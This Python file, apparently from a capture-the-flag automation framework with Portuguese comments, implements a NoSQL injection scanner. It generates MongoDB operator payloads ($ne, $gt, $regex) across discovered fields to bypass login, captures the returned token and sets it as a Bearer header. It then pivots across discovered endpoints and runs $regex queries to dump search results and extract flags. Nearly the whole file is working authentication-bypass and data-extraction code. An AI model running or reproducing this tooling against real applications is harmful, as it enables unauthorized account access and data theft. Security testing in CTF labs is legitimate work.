"""
domains/detection/nosqli_scanner.py — Scanner de NoSQL Injection (MongoDB/etc).

Testa operadores $ne/$gt/$regex em todas as combinações de campos para
burlar autenticação e endpoints de busca. Sem hardcode de campos —
descobre dinamicamente via baseline ou fallback por tipo de endpoint.

Após bypass: injeta o token na sessão e faz pivot nos endpoints descobertos.
"""

from __future__ import annotations

import json
import re
from typing import Iterable, Any

from ctflab.core.scanner import BaseScanner
from ctflab.core.models import ScanResult
from ctflab.core import http as H

_FLAG_RE   = re.compile(r'(?:CTF|FLAG|HTB|picoCTF|DUCTF)\{[^}]+\}', re.IGNORECASE)
_OPERATORS = [{"$ne": None}, {"$ne": "x_1337"}, {"$gt": ""}, {"$regex": ".*"}]

_COMMON_AUTH   = ["username", "email", "user", "login", "password", "pass"]
_COMMON_SEARCH = ["title", "body", "content", "query", "search", "name", "text", "q"]
_SEARCH_PATHS  = ["/entries/search", "/search", "/filter", "/find", "/api/search"]


class NoSQLiScanner(BaseScanner):
    name = "nosqli_detection"
    capabilities = ["http", "nosqli", "detection"]

    def __init__(self, ctx, path: str = "/login", param: str = "username"):
        super().__init__(ctx)
        self.path  = path
        self.param = param

    # ── BaseScanner contract ──────────────────────────────────────────────────

    def get_payloads(self) -> Iterable[Any]:
        fields = self._fields()
        is_auth = any(k in self.path.lower() for k in ("login", "auth", "signin", "session"))

        # 1. Cada campo com operador, demais com "dummy"
        for target in fields:
            for op in _OPERATORS:
                yield {f: (op if f == target else "dummy_1337") for f in fields}

        # 2. Todos os campos com operador (bypass duplo)
        # Em login, isso gera: {"username": {"$ne": null}, "password": {"$ne": null}}
        for op in _OPERATORS:
            yield {f: op for f in fields}

        # 3. Payload agressivo para bypass de login (específico)
        if is_auth:
            yield {"username": {"$ne": "admin"}, "password": {"$ne": "invalid"}}
            yield {"user": {"$ne": ""}, "pass": {"$ne": ""}}
            yield {"email": {"$gt": ""}, "password": {"$gt": ""}}

    def execute(self, payload: Any) -> Any:
        return H.post(self.ctx.session, self.path, payload=payload)

    def analyze(self, payload: Any, response: Any) -> ScanResult:
        # Debug: ver o que está acontecendo
        from ctflab.core.logger import logger
        logger.info(f"NoSQLi [{self.path}]: Status {response.status_code} | Body: {response.text[:100]}...")

        # FIX Bug 2: OR em vez de AND — qualquer 200 sem token é falso positivo.
        # Bypass real exige status 200 E token presente no body.
        if response.status_code != 200 or "token" not in response.text.lower():
            return ScanResult(success=False, confidence=0.0, details="-")

        logger.info(f"NoSQLi SUCCESS on {self.path} with payload: {payload}")

        # Já fez bypass — impede que workers concorrentes repivoteiem (Bug 3).
        if self.ctx.session.recall("_nosqli_pivoted", ""):
            self._inject_token(response)
            return ScanResult(
                success=True,
                confidence=0.95,
                details=f"NoSQLi bypass (token já pivoteado): {payload}",
                severity="Critical",
            )

        self.ctx.session.remember("_nosqli_pivoted", "1")
        self._inject_token(response)
        logger.info(f"Token after inject: {self.ctx.session.recall('token', 'MISSING')}")
        self._pivot()

        return ScanResult(
            success=True,
            confidence=0.95,
            details=f"NoSQLi bypass: {payload}",
            severity="Critical",
        )

    # ── descoberta de campos ──────────────────────────────────────────────────

    def _fields(self) -> list[str]:
        """Descobre campos via baseline; fallback por tipo de endpoint."""
        try:
            r = H.post(self.ctx.session, self.path, payload={})
            found = []
            pool = _COMMON_AUTH if any(
                k in self.path.lower() for k in ("login", "auth", "signin", "session")
            ) else _COMMON_SEARCH
            for f in pool:
                if f in r.text.lower():
                    found.append(f)
            if found:
                # Garante campos mínimos para login se um sumiu no baseline
                if "login" in self.path.lower() and len(found) < 2:
                    for m in ["username", "password"]:
                        if m not in found: found.append(m)
                return found
        except Exception:
            pass

        # fallback
        if any(k in self.path.lower() for k in ("login", "auth", "signin", "session")):
            # Se for /login e o baseline falhou, assume username/password
            return ["username", "password"]
        return _COMMON_SEARCH[:3]

    # ── pós-bypass ────────────────────────────────────────────────────────────

    def _inject_token(self, response: Any) -> None:
        """Salva o token na sessão E injeta no header para requisições seguintes."""
        # intel._record() já cuida disso, mas pode não ter rodado ainda
        existing = self.ctx.session.recall("token", "")
        if existing:
            if "Authorization" not in self.ctx.session.headers:
                self.ctx.session.set_header("Authorization", f"Bearer {existing}")
            return
        try:
            data = json.loads(response.text)
            for k in ("token", "access_token", "jwt", "auth_token", "api_key"):
                if k in data and isinstance(data[k], str) and len(data[k]) > 10:
                    self.ctx.session.remember("token", data[k])
                    self.ctx.session.set_header("Authorization", f"Bearer {data[k]}")
                    return
        except Exception:
            pass

    def _pivot(self) -> None:
        """
        Com o token injetado:
        1. Acessa todos os endpoints descobertos (intel extrai flag via _record)
        2. Testa endpoints de busca com $regex em cada campo comum

        FIX Bug 3: aborta silenciosamente se token ainda não está na sessão
        (evita race condition quando múltiplos workers chegam simultâneos).
        """
        if not self.ctx.session.recall("token", ""):
            return

        all_eps = self.ctx.session.recall("_all_discovered_endpoints", [])
        if not isinstance(all_eps, list):
            all_eps = []

        # Pivot 1 — todos os endpoints descobertos (GET)
        for ep in all_eps:
            if ep == self.path:
                continue
            try:
                H.get(self.ctx.session, ep)
            except Exception:
                pass

        # Pivot 2 — busca com $regex em endpoints de busca
        search_eps = [
            ep for ep in all_eps
            if any(k in ep.lower() for k in ("search", "filter", "find"))
        ] + _SEARCH_PATHS

        seen = set()
        for ep in search_eps:
            if ep in seen:
                continue
            seen.add(ep)
            for field in _COMMON_SEARCH:
                try:
                    r = H.post(
                        self.ctx.session,
                        ep,
                        payload={field: {"$regex": ".*"}},
                    )
                    if r.status_code == 200 and len(r.text) > 10:
                        for m in _FLAG_RE.finditer(r.text):
                            self.ctx.session.flag(m.group())
                        break
                except Exception:
                    pass
